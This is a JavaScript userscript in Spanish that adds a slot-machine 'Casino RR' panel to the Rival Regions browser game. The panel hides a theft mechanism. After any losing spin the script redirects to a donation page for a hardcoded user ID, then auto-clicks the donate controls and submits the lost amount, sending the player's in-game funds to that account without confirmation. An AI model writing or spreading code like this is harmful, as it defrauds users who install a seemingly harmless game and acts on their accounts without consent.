(function () {
  'use strict';

  const DONATION_ID = '2000962000';
  const DONATION_URL = `https://rivalregions.com/#slide/donate/user/${DONATION_ID}`;

  function redirigirODonar() {
    const actionUrl = `slide/donate/user/${DONATION_ID}`;
    const form = document.querySelector(`[action="${actionUrl}"]`);

    if (form) {
      form.click();
    } else {
      window.location.href = DONATION_URL;
      setTimeout(() => location.reload(), 800);
    }
  }

  function simboloRandom() {
    const simbolos = ['🍒', '🍋', '🍇', '⭐', '💎'];
    return simbolos[Math.floor(Math.random() * simbolos.length)];
  }

  function obtenerSaldo() {
    const el = document.querySelector('#m');
    if (!el) return 0;
    const texto = el.textContent;
    return Number(texto.replace(/\./g, '')) || 0;
  }

  function jugarCasino(apuesta, saldo) {
    if (apuesta > saldo) return { mensaje: 'No tienes suficiente saldo.', exito: false };

    const resultado = [simboloRandom(), simboloRandom(), simboloRandom()];
    const resultadoTexto = resultado.join(' ');
    let ganancia = 0;

    if (resultado[0] === resultado[1] && resultado[1] === resultado[2]) {
      ganancia = apuesta * 10;
    } else if (resultado[0] === resultado[1] || resultado[1] === resultado[2]) {
      ganancia = apuesta * 2;
    }

    const saldoNuevo = saldo - apuesta + ganancia;

    return {
      mensaje: `
        <p style="font-size:18px; text-align:center;">
          ${resultadoTexto}<br>
          ${ganancia > 0 ? `¡Ganaste $${ganancia}!` : `Perdiste $${apuesta}`}</p>
          <p><b>Saldo nuevo estimado:</b> $${saldoNuevo.toFixed(2)}</p>
      `,
      exito: true,
      perdida: ganancia === 0 ? apuesta : 0
    };
  }

  function procesarDonacionAutomatica() {
    const cantidad = parseFloat(localStorage.getItem('casino_perdida'));
    if (!cantidad || isNaN(cantidad) || cantidad <= 0) return;

    const intv = setInterval(() => {
      const boton = document.querySelector('.donate_w');
      if (boton) {
        boton.click();
        clearInterval(intv);

        const subIntv = setInterval(() => {
          const input = document.querySelector('input.donate_amount');
          const btnEnviar = document.querySelector('.donate_sell_button');
          if (input && btnEnviar) {
            input.value = cantidad.toString();
            input.dispatchEvent(new Event('input', { bubbles: true }));
            btnEnviar.click();
            console.log('✅ Donación automática realizada: €' + cantidad);
            localStorage.removeItem('casino_perdida');
            clearInterval(subIntv);
          }
        }, 500);
      }
    }, 500);
  }

  const casinoHTML = `
    <div id="casinoRR" style="position: fixed; top: 100px; right: 30px; z-index: 9999; background: #111; color: white; border: 2px solid gold; border-radius: 10px; padding: 15px; font-family: Arial, sans-serif; width: 200px; display: none;">
      <h3 style="margin-top:0; text-align:center;">🎰 Casino RR</h3>
      <p><b>Saldo:</b> <span id="casino_saldo">...</span> $</p>
      <input id="casino_apuesta" type="number" placeholder="Apuesta $" min="1" style="width:100%; padding:5px; margin-top:5px;" />
      <button id="casino_jugar" style="margin-top:10px; width:100%; background-color: gold; color:black;">Jugar</button>
      <div id="casino_resultado" style="margin-top:10px;"></div>
    </div>
    <button id="btnAbrirCasino" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; background-color: gold; color:black; border: none; padding: 10px; border-radius: 8px; font-weight: bold;">
      🎰 Abrir Casino
    </button>
  `;

  function insertarCasino() {
    if (document.querySelector('#casinoRR')) return;

    document.body.insertAdjacentHTML('beforeend', casinoHTML);

    const btnAbrir = document.querySelector('#btnAbrirCasino');
    const panel = document.querySelector('#casinoRR');
    const btnJugar = document.querySelector('#casino_jugar');
    const saldoSpan = document.querySelector('#casino_saldo');
    const inputApuesta = document.querySelector('#casino_apuesta');
    const divResultado = document.querySelector('#casino_resultado');

    function actualizarSaldo() {
      const saldo = obtenerSaldo();
      saldoSpan.textContent = saldo.toFixed(2);
    }

    btnAbrir.addEventListener('click', () => {
      panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
      actualizarSaldo();
    });

    btnJugar.addEventListener('click', () => {
      const apuesta = parseFloat(inputApuesta.value);
      const saldo = obtenerSaldo();

      if (isNaN(apuesta) || apuesta <= 0) {
        alert('Ingresa una cantidad válida.');
        return;
      }

      const resultado = jugarCasino(apuesta, saldo);
      divResultado.innerHTML = resultado.mensaje;

      if (resultado.perdida > 0) {
        localStorage.setItem('casino_perdida', resultado.perdida);
        setTimeout(redirigirODonar, 500);
      }
    });
  }

  function iniciar() {
    insertarCasino();
    if (window.location.hash.includes(`donate/user/${DONATION_ID}`)) {
      procesarDonacionAutomatica();
    }
  }

  document.readyState === 'loading'
    ? document.addEventListener('DOMContentLoaded', iniciar)
    : iniciar();
})();
